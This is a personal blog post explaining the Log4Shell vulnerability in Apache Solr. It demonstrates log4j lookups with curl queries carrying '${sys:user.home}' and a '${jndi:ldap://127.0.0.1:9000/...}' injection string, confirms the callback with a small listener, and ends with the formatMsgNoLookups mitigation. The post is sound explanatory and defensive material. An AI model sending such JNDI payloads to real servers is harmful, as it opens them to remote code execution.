<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="HectorCorrea.com">
    <meta name="author" content="hector@hectorcorrea.com">

    <title>HectorCorrea.com</title>

    <link rel="shortcut icon" href="/public/favicon.ico" />
    <link rel="apple-touch-icon" href="/public/favicon.png"/>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="me" href="https://mastodon.social/@hectorjcorrea" />
    <link rel="canonical" href="https://hectorcorrea.com" />

    <style>
      header {
        background-color:  #e1ebf7;
        margin-left: 0px;
        height: 50px;
        max-width: unset;
        padding-top: 10px;
        padding-left: 20px;
        padding-right: 20px;
        border-bottom-style: solid;
        border-bottom-width: 2px;
      }

      footer {
        font-weight: lighter;
        font-size: smaller;
        margin-top: 10px;
        margin-left: 0px;
        height: 50px;
        max-width: unset;
        padding-top: 10px;
        padding-left: 20px;
        padding-right: 20px;
        border-top-style: solid;
        border-top-width: 1px;
      }

      h1 {
        margin-top: 20px;
      }

      blockquote {
        padding: 10px 20px;
        margin: 0 0 20px;
        border-left: 5px solid #eee;
        font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;
      }

      img {
        padding: 5px;
        box-shadow: 3px 3px 8px #222;
        margin-right: 10px;
        margin-bottom: 10px;
      }

      /* Overwrite Bootstrap's default */
      code {
        background-color: #f0f1f2;
        color: #0D0D0D; /* gray-ish */
      }

      /* Custom code and terminal styles */
      pre, pre.code {
        margin-left: 20px;
        display: block;
        padding: 9.5px;
        margin: 0 0 10px;
        margin-left: 0px;
        font-size: 13px;
        line-height: 1.428571429;
        color: #333;
        word-break: break-all;
        word-wrap: break-word;
        background-color: #f5f5f5;
        border: 1px solid #ccc;
        border-radius: 4px;
      }

      pre.terminal {
        margin-left: 20px;
        margin-bottom: 20px;
        background-color: #363446;
        color: #DAD681; /* yellow-ish */
        padding-bottom: 10px;
        padding-top: 10px;
        padding-left: 10px;
        padding-right: 50px;
      }

      .socialList {
        list-style: none;
        padding: 5px;
      }

      .socialLogo {
        padding: 0px;
        box-shadow: none;
        margin-right: 0px;
        margin-bottom: 0px;
        width: 16px;
      }
    </style>
  </head>
  <body>
    <header>
      <a href="/">HectorCorrea.com</a>
      <span style="float:right;">
        <a id="about-menu" href="/about" role="button" class="btn btn-secondary btn-sm">About</a>
        <a id="blog-menu" href="/blog" role="button" class="btn btn-secondary btn-sm">Blog</a>
      </span>
    </header>

    <div class="container">
      <h1>Log4Shell and Solr</h1>
<p>Last week the disclosure of the <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">Log4Shell vulnerability</a> took many of us Solr users by surprise. When I first heard about it I didn't pay much attention to it since I figured that the problem was that somebody had found how to leak information <i>into the Solr log files</i>, something that is bad but that has limited exposure. However, one of my colleagues pointed out that the vulnerability allowed for <i>remote code execution (RCE)</i> and that is indeed scary.</p>

<p>As it turns out <code>log4j</code>, the library that Solr uses to log information, can be configured to insert certain dynamic tokens of information and one of these tokens allows it to connect to a remote server to download code and execute it. I am not a Java developer so this was news to me and I got curious to see how this works in practice.</p>

<p>In a Solr installation the problem can be triggered by a user submitting a search via our application. If the user submits a query that is logged and that query has the correct syntax to trigger the expansion then they can trigger the vulnerability. And this is surprisingly easy to do.</p>

<p>To demonstrate this in this blog post I am using Solr <code>8.7.0</code> with the default logging settings, but there are <a href="https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228">many versions of Solr affected</a> by this vulnerability.</p>


<h2>Leaking information into the logs</h2>
<p>One simple way of triggering this behavior in your local Solr is by issuing a simple command like this:</p>

<pre>
curl 'http://localhost:8983/solr/demo1/select?q=$\{sys:user.home\}'
</pre>

<p>The <code>${sys:user.home}</code> parameter in the URL is what causes <code>log4j</code> to execute the dynamic expansion as it logs the information. In this case it will log the name of the user name that Solr is running under.</p>

<p>You can validate this by looking at the Solr log file with a command like this  <code>cat ./solr-8.7.0/server/logs/solr.log</code>, the log will include a line with the following information:</p>

<pre>
2021-12-13 20:53:12.984 INFO  (qtp1845623216-26) [   x:demo1] o.a.s.c.S.Request [demo1]  webapp=/solr path=/select params={q=/Users/correah=} hits=0 status=0 QTime=0
</pre>

<p>Notice how the <code>q=${sys:user.home}</code> got expanded into <code>q=/Users/correah</code> when the line was logged by Solr. There are <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution">many values that are supported</a> and that <code>log4j</code> knows how to process, I believe this expansion is known as Property Substitution in the Java world.</p>

<p>Notice that the special token was passed on the <code>q</code> parameter to Solr, this is what I mean when I say that it is very easy for a user of our application to trigger the vulnerability.</p>

<h2>Remote Code Execution</h2>

<p>Leaking information into the logs like this is pretty bad, but the reason the vulnerability is scary is because one of the property substitutions that <code>log4j</code> supports allows it to connect to a remote host, download a piece of information, and execute it. This means that if a user submits a query through our application with the proper syntax, <code>log4j</code> will connect to a website controlled by this user and could force it to download and execute code on our servers.</p>

<p>This is possible is because one of the property substitutions that <code>log4j</code> recognizes allows to indicate a remote server. This is done via the <code>jndi</code> prefix. So if instead of passing a query like <code>${sys:user.home}</code> as we did before, we pass one that invokes <code>jndi</code> we can have our Solr connect to a remote host.</p>

<p>For example let's say that we pass a query with <code>${jndi:ldap://127.0.0.1:9000/hello-world}</code> as shown below:</p>

<pre>
curl 'http://localhost:8983/solr/demo1/select?q=$\{jndi:ldap://127.0.0.1:9000/hello-world\}'
</pre>

<p>As <code>log4j</code> logs this query it will connect to a remote host, in this case it will connect to our local host on port <code>9000</code> via LDAP, but it could connect to any machine that the user indicates in the query string! The folks at Fastly have a <a href="https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j">great explanation on how the remote code execution works in practice</a> for this vulnerability.</p>


<h2>Reaching to a remote host</h2>
<p>Since I am not a Java developer I found it pretty hard to validate that Solr is indeed connecting to a remote host when I issue a command with <code>${jndi:ldap://127.0.0.1:9000/hello-world}</code> in the query string. The Solr log looks pretty innocent since it logs the string as-is (i.e. it does not look like it expanded it into anything):</p>

<pre>
2021-12-13 21:17:49.801 INFO  (qtp1845623216-22) [   x:demo1] o.a.s.c.S.Request [demo1]  webapp=/solr path=/select params={q=${jndi:ldap://127.0.0.1:9000/hello-world}} status=400 QTime=0
</pre>

<p>However, I was able to write a little tiny TCP server in Node.js that allowed me to see that Solr was indeed reaching out to <code>127.0.0.1:9000</code>. The code that I wrote is listed below:</p>

<pre>
// tcpserver.js
// An simple server over TCP. Always returns "hello" and disconnects.
// Test with: "telnet localhost 9000" or "nc localhost 9000"
var net = require("net");
var port = 9000;
var server = net.createServer();

server.on('connection', function(socket) {
    // Show that somebody connected.
    var now = new Date();
    console.log("%s =&gt; connection from: %s", now.toISOString(), socket.remoteAddress + ":" + socket.remotePort);

    // Send back "hello" and disconnect.
    socket.write("hello\r\n");
    socket.destroy()
});

console.log("Started TCP listener on port:" + port);
server.listen(port);
</pre>

<p>With this code I was able to run <code>node tcpserver.js</code> and then issue <code>curl 'http://localhost:8983/solr/demo1/select?q=$\{jndi:ldap://127.0.0.1:9000/hello-world\}'</code> again and see the following in my terminal:</p>

<pre>
$ node tcpserver.js 
Started TCP listener on port:9000
2021-12-13T21:34:53.338Z =&gt; connection from: ::ffff:127.0.0.1:55748
</pre>

<p>Notice how it detected a <code>connection from ::ffff:127.0.0.1:55748</code>. This line is the result of <code>log4j</code> attempting to make the <code>ldap://127.0.0.1:9000/hello-world</code> connection. My little TCP server is not an LDAP server so it does not return the proper information for Solr to download code and execute it, but it does show that Solr is reaching out to a remote host just by crafting the proper search terms.</p>

<p>From what I understand the <code>jndi</code> prefix supports many kind of <a href="https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used">communications protocols</a> and it can connect via LDAP and DNS but not via HTTP.</p>

<p>My tiny TCP server always return "hello" back to the client and disconnects, but a real LDAP server could return information that will fully exploit the server as indicated in the Fastly blog post.</p>

<p>If you are on Linux you can use <a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/">ncat</a> to validate that the remote connections are taking place instead of using the little TCP server that I showed here. Just run a command like this instead:</p>

<pre>
ncat -k -vv -c "echo ---CONNECTION [%NCAT_REMOTE_PORT%]--- 1&gt;&2" -l 9000
</pre>

<h2>The fix</h2>
<p>Apache Solr has <a href="https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228">released a fix for this vulnerability</a>. I was able to validate that if we start our Solr installation with the <code>Dlog4j2.formatMsgNoLookups=true</code> setting then Solr will not reach out to a remote host when it receives the <code>${jndi:ldap://127.0.0.1:9000/hello-world}</code> string.</p>

<p>Below is an example of how to start Solr with this parameter:</p>

<pre>
SOLR_OPTS="-Dlog4j2.formatMsgNoLookups=true" ./solr start
</pre>

<p>The following screenshots shows how to confirm Solr is running with the <code>log4j2.formatMsgNoLookups=true</code> setting</p>

<p><img src="https://hectorcorrea.com/images/solr_formatmsgnolookups.jpg" alt="Log4j setting" title="Log4j setting" /></p>

<p>Keep in mind that with this setting the dynamic expansion of tokens like <code>${sys:user.home}</code> still takes place, but Solr does not reach out to remote hosts.</p>

    </div>

    <footer>
      License <a rel="license" target="_blank" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
    </footer>

    <script type="text/javascript">
      // Redirect legacy blog URLs
      if (window.location.hash.startsWith("#/blog")) {
        window.location = window.location.toString().replace("#/blog/","blog/");
      }

      // Highlight the current menu option
      var highlightMenu = function() {
        var about = document.getElementById("about-menu");
        var blog = document.getElementById("blog-menu");
        var url = window.location.pathname;
        if (url.startsWith("/blog/")) {
          blog.classList.add("btn-primary");
          blog.classList.remove("btn-secondary");
        } else if(url == "/about") {
          about.classList.add("btn-primary");
          about.classList.remove("btn-secondary");
        }
      }

      highlightMenu();
    </script>
  </body>
</html>
